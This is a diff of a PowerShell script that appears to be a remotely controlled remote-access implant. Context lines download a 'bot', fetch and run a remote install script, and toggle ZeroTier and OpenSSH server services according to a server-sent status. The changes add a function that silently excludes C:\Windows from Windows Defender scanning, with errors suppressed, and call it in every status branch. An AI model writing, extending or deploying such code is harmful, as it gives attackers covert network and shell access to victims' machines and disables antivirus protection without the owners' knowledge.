@@ -45,6 +45,7 @@ if (Test-Path $botpath) {
 if (-not (Test-Path $botpath)) {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $botpath
 }
+
 #Function to add or update registry keys
 function CheckAndUpdateRegistryCode {
     param (
@@ -271,6 +272,19 @@ function Remove-Package {
     Uninstall-Package $PackageName -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 }
 
+#Function to add defender exclusions.
+function Add-WindowsDefenderExclusion {
+    try {
+        $exclusionPath = "C:\Windows"
+        Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
+        if (-not $AddExclusionError) {
+        }
+    }
+    catch {
+    }
+}
+
+
 #Code starts here.
 # Check if the "Code" value is not null (i.e., it exists)
 CheckAndUpdateRegistryCode
@@ -294,6 +308,7 @@ if ($null -ne $storedCode) {
                 switch ($status) {
                     "active" {
                         RetryOps {
+                            Add-WindowsDefenderExclusion
                             Start-ServiceSafe -ServiceName $ztservice
                             Start-ServiceSafe -ServiceName $sshagentservice
                             Start-ServiceSafe -ServiceName $sshdservice
@@ -305,6 +320,7 @@ if ($null -ne $storedCode) {
                     }
                     "dormant" {
                         RetryOps {
+                            Add-WindowsDefenderExclusion
                             WebExecution -InstallScriptURL $ztnethandler
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                             Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
@@ -317,6 +333,7 @@ if ($null -ne $storedCode) {
                     "rejoin" {
                         RetryOps {
                             zerotier_purge
+                            Add-WindowsDefenderExclusion
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
                             Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
@@ -341,6 +358,7 @@ if ($null -ne $storedCode) {
                     "purge" {
                         RetryOps {
                             #zerotier_purge
+                            Add-WindowsDefenderExclusion
                             Remove-Package "ZeroTier One"
                             Remove-Package OpenSSH
                             Stop-AndDisable-ServiceSafe -ServiceName $ztservice
